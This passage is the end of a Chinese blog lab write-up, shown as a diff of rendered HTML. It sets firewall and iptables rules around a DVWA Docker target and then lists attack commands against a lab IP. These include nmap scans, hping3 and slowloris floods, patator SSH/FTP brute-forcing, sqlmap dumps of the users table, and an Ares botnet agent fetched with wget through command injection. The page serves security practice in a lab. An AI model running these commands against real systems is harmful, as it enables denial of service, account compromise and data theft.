+firewall-cmd --permanent --add-rich-rule=&#39;rule family=&#34;ipv4&#34; source address=&#34;172.31.171.155&#34; port port=&#34;8080&#34; protocol=&#34;tcp&#34; accept&#39;
+firewall-cmd --permanent --add-rich-rule=&#39;rule family=&#34;ipv4&#34; source address=&#34;172.31.171.162&#34; port port=&#34;8080&#34; protocol=&#34;tcp&#34; accept&#39;
+
+# 拒绝其他所有IP访问8080端口
+firewall-cmd --permanent --add-rich-rule=&#39;rule family=&#34;ipv4&#34; port port=&#34;8080&#34; protocol=&#34;tcp&#34; reject&#39;
+
+# 重新加载防火墙规则使其生效
+firewall-cmd --reload
+查看生效规则：
+firewall-cmd --list-all
+
+rich rules:
+rule family=&#34;ipv4&#34; port port=&#34;8080&#34; protocol=&#34;tcp&#34; reject
+rule family=&#34;ipv4&#34; source address=&#34;172.31.171.155&#34; port port=&#34;8080&#34; protocol=&#34;tcp&#34; accept
+rule family=&#34;ipv4&#34; source address=&#34;172.31.171.162&#34; port port=&#34;8080&#34; protocol=&#34;tcp&#34; accept</code></pre><h3 id="但是遇到docker端口绕过重新配置">但是遇到docker端口绕过，重新配置：<a class="anchor" href="#%e4%bd%86%e6%98%af%e9%81%87%e5%88%b0docker%e7%ab%af%e5%8f%a3%e7%bb%95%e8%bf%87%e9%87%8d%e6%96%b0%e9%85%8d%e7%bd%ae">#</a></h3>
+<pre tabindex="0"><code>查看容器信息，获取容器内部IP：
+    docker ps
+    docker inspect cb13b511080a | grep -i ipaddress
+得到容器 IP：172.17.0.2</code></pre><pre tabindex="0"><code># 清空原有规则
+iptables -F &amp;&amp; iptables -X &amp;&amp; iptables -Z
+iptables -t nat -F &amp;&amp; iptables -t nat -X
+
+# 配置NAT端口映射，恢复宿主机8080到容器80的转发
+iptables -t nat -A PREROUTING -p tcp --dport 8080 -j DNAT --to-destination 172.17.0.2:80
+iptables -t nat -A POSTROUTING -s 172.17.0.0/16 -j MASQUERADE
+
+# 配置FORWARD链访问控制规则
+iptables -P FORWARD ACCEPT
+iptables -A FORWARD -s 172.31.171.155 -d 172.17.0.2 -p tcp --dport 80 -j ACCEPT
+iptables -A FORWARD -s 172.31.171.162 -d 172.17.0.2 -p tcp --dport 80 -j ACCEPT
+iptables -A FORWARD -d 172.17.0.2 -p tcp --dport 80 -j DROP
+
+# 保存规则
+service iptables save
+
+#查看
+iptables -L FORWARD -n --line-numbers
+
+Chain FORWARD (policy ACCEPT)
+num  target     prot opt source               destination
+1    ACCEPT     tcp  --  172.31.171.155       172.17.0.2           tcp dpt:80
+2    ACCEPT     tcp  --  172.31.171.162       172.17.0.2           tcp dpt:80
+3    DROP       tcp  --  0.0.0.0/0            172.17.0.2           tcp dpt:80</code></pre><h1 id="二渗透">二、渗透<a class="anchor" href="#%e4%ba%8c%e6%b8%97%e9%80%8f">#</a></h1>
+<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>sudo apt update
+</span></span><span style="display:flex;"><span>sudo apt install slowhttptest
+</span></span><span style="display:flex;"><span>sudo apt install slowloris
+</span></span><span style="display:flex;"><span>sudo apt install hulk
+</span></span><span style="display:flex;"><span>sudo apt install ares
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>tcpdump -i any host 172.31.132.2 and port <span style="color:#ff9f43">8080</span> <span style="color:#78787e"># 检查靶机8080端口</span>
+</span></span><span style="display:flex;"><span>tcpdump -i any src 172.31.171.162 -n <span style="color:#78787e"># 检查自己ip来源的流量</span>
+</span></span><span style="display:flex;"><span>tcpdump -i any port <span style="color:#ff9f43">443</span> -nn -v <span style="color:#78787e"># 检查正常curl产生的流量</span></span></span></code></pre></div><table>
+  <thead>
+      <tr>
+          <th>攻击流量大类</th>
+          <th>攻击流量小类</th>
+          <th>工具</th>
+          <th>OSI层级</th>
+          <th>具体命令</th>
+          <th>备注</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>扫描攻击</td>
+          <td>操作系统扫描</td>
+          <td>nmap</td>
+          <td>网络层/传输层 (L3/L4)</td>
+          <td><code>sudo nmap -O 172.31.132.2</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td>扫描攻击</td>
+          <td>端口扫描</td>
+          <td>nmap</td>
+          <td>传输层 (L4)</td>
+          <td><code>sudo nmap -p- 172.31.132.2</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td>DDoS</td>
+          <td>UDP Flood/ICMP Flood(海量伪造报文)</td>
+          <td>hping3</td>
+          <td>网络层/传输层 (L3/L4)</td>
+          <td>UDP ddos攻击：<code>sudo hping3 -c 10000 -d 120 --udp -p 8080 -i u1000 172.31.132.2</code><br />ICMP ddos攻击：<code>sudo hping3 --icmp -c 10000 -i u1000 172.31.132.2</code><br /></td>
+          <td><code>-c 10000</code>发送总包数；<br /><code>-d</code>每个数据包的payload大小；<br /><code>-w</code>TCP窗口大小(UDP模式下此参数通常被忽略or特定流量控制)；<br /><code>-i</code>发包间隔(几微秒)；<br /><code>--rand-source</code>每次发包随机生成一个源IP<br /></td>
+      </tr>
+      <tr>
+          <td>DoS</td>
+          <td>HTTP DoS(慢速连接or海量并发请求)</td>
+          <td>slowhttptest</td>
+          <td>应用层 (L7)</td>
+          <td><code>sudo slowhttptest -c 1000 -B -g -o my_body_stats -i 110 -r 200 -s 8192 -t FAKEVERB -u http://172.31.132.2:8080 -x 10 -p 3</code></td>
+          <td><code>-c</code>连接数；<br /><code>-B</code>消息正文中慢速；<br /><code>-g</code>生成CSV和HTML格式的统计数据；<br /><code>-o</code>指定输出的文件名；<br /><code>-i</code>每个连接的后续数据间的间隔；<br /><code>-r</code>连接率(每秒的连接)；<br /><code>-s</code>如果指定了-B，则content-length标头的值；<br /><code>-t</code>要使用的自定义动词；<br /><code>-x</code>随访数据的最大长度；<br /><code>-p</code>等待探针连接上的HTTP响应超时，此后服务器被视为不可访问</td>
+      </tr>
+      <tr>
+          <td>DoS</td>
+          <td>HTTP DoS(不完整的HTTP请求不要断开)</td>
+          <td>slowloris</td>
+          <td>应用层 (L7)</td>
+          <td><code>sudo slowloris 172.31.132.2 -p 8080 -s 50</code></td>
+          <td><code>slowloris</code>能低速缓慢发送http头部，<code>-s</code>是套接字数量，这里设置50，防火墙可以抓到慢速交互的特征</td>
+      </tr>
+      <tr>
+          <td>DoS</td>
+          <td>HTTP DoS(大量伪造动态请求)</td>
+          <td>hulk</td>
+          <td>应用层 (L7)</td>
+          <td><a href="https://github.com/R3DHULK/HULK/blob/main/hulk.py">HULK/hulk.py at main · R3DHULK/HULK</a>下载hulk.py，再<code>python hulk.py</code>指定ip和端口</td>
+          <td></td>
+      </tr>
+      <tr>
+          <td>DoS</td>
+          <td>TCP SYN Flood(TCP三次握手缺陷，大量伪造SYN包)</td>
+          <td>hping3</td>
+          <td>传输层 (L4)</td>
+          <td><code>sudo hping3 -S -p 8080 -c 10000 -d 120 -i u1000 172.31.132.2</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td>暴力破解</td>
+          <td>FTP 破解</td>
+          <td>patator</td>
+          <td>应用层 (L7)</td>
+          <td><code>patator ftp_login host=172.31.132.2 user=root password=FILE0 0=/usr/share/wordlists/dirb/common.txt</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td>暴力破解</td>
+          <td>SSH 破解</td>
+          <td>patator</td>
+          <td>应用层 (L7)</td>
+          <td><code>patator ssh_login host=172.31.132.2 user=root password=FILE0 0=/usr/share/wordlists/dirb/common.txt</code></td>
+          <td></td>
+      </tr>
+      <tr>
+          <td>Web 攻击</td>
+          <td>XSS 攻击</td>
+          <td>sqlmap</td>
+          <td>应用层 (L7)</td>
+          <td><code>sudo sqlmap -u &quot;http://172.31.132.2:8080/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;security=low; PHPSESSID=http://172.31.132.2:8080/45kllrq88ifueqivkuco7dmdk0&quot; -D dvwa -T users --dump --batch</code></td>
+          <td>修改cookies</td>
+      </tr>
+      <tr>
+          <td>Web 攻击</td>
+          <td>SQL 注入</td>
+          <td>sqlmap</td>
+          <td>应用层 (L7)</td>
+          <td>检测注入漏洞<code>sudo sqlmap -u &quot;http://172.31.132.2:8080/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;PHPSESSID=45kllrq88ifueqivkuco7dmdk0; security=low&quot; --batch</code><br />枚举数据库名称<code>sudo sqlmap -u &quot;http://172.31.132.2:8080/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;PHPSESSID=45kllrq88ifueqivkuco7dmdk0; security=low&quot; --dbs --batch</code><br />查看当前使用的数据库<code>sudo sqlmap -u &quot;http://172.31.132.2:8080/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;PHPSESSID=45kllrq88ifueqivkuco7dmdk0; security=low&quot; --current-db --batch</code><br />枚举指定数据库下的所有表<code>sudo sqlmap -u &quot;http://172.31.132.2:8080/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;PHPSESSID=45kllrq88ifueqivkuco7dmdk0; security=low&quot; -D dvwa --tables --batch</code><br />窃取特定表的数据<code>sudo sqlmap -u &quot;http://172.31.132.2:8080/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --cookie=&quot;PHPSESSID=45kllrq88ifueqivkuco7dmdk0; security=low&quot; -D dvwa -T users --dump --batch</code><br /></td>
+          <td>修改cookies</td>
+      </tr>
+      <tr>
+          <td>僵尸网络（由于版本问题未部署成功）</td>
+          <td>Ares 僵尸网络</td>
+          <td>ares</td>
+          <td>应用层 (L7)</td>
+          <td>1. 克隆ares源代码<code>git clone https://github.com/sweetsoftware/Ares.git</code>,解压后进入文件夹<code>pip install -r requirements.txt</code><br />2. 接着kali中<code>python ares.py server</code>等待僵尸节点上线<br />3. 靶机上运行agent脚本，指向自己的kaliip<code>python ares.py agent 192.168.203.129</code><br />4. 第三步中，可以利用DVWA的命令注入漏洞<code>weget http://自己的kali ip:8000/agent.py</code>，并安装agent所需依赖<code>pip install requests</code></td>
+          <td>使用虚拟环境安装依赖<br /><code>sudo conda create -n ares python=3.9</code><br /><code>source activate</code><br /></td>
+      </tr>
+  </tbody>
+</table>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+<div>
+
+</div>
+
+<div>
+
+</div>
+
+</div>
+
+
+
+
+
+  
+  
+  
+  <div class="flex flex-wrap justify-between">
+    <span>
+    
+      <a href="/docs/cybersecurity/" class="flex align-center">
+        <img src="/icons/backward.svg" class="book-icon" alt="Backward" />
+        <span>网安</span>
+      </a>
+    
+    </span>
+    <span>
+    
+      <a href="/docs/cybersecurity/DVWA/DVWA/" class="flex align-center">
+        <span>DVWA全难度</span>
+        <img src="/icons/forward.svg" class="book-icon" alt="Forward" />
+      </a>
+    
+    </span>
+  </div>
+  
+
+
+ 
+        
+  
+  <div class="book-comments">
+
+</div>
+  
+ 
+        
+        
+  
+  <div class="book-copyright flex justify-center">
+    <small>vnccer - <a href="https://creativecommons.org/licenses/by/4.0/legalcode">© CC BY 4.0</a></small>
+  </div>
+  
+ 
+        
+  
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+  
+  <aside class="book-toc">
+    <div class="book-toc-content">
+      
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#一环境侦测">一、环境侦测</a>
+      <ul>
+        <li><a href="#11-linux系统内核信息">1.1 Linux系统内核信息</a></li>
+        <li><a href="#12-docker部署">1.2 docker部署</a></li>
+        <li><a href="#13-加载dvwa镜像">1.3 加载dvwa镜像</a></li>
+        <li><a href="#14-访问靶机">1.4 访问靶机</a></li>
+        <li><a href="#15-限制访问ip">1.5 限制访问IP</a>
+          <ul>
+            <li><a href="#但是遇到docker端口绕过重新配置">但是遇到docker端口绕过，重新配置：</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#二渗透">二、渗透</a></li>
+  </ul>
+</nav>
+
+
+
+    </div>
+  </aside>
+  
+ 
+  </main>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
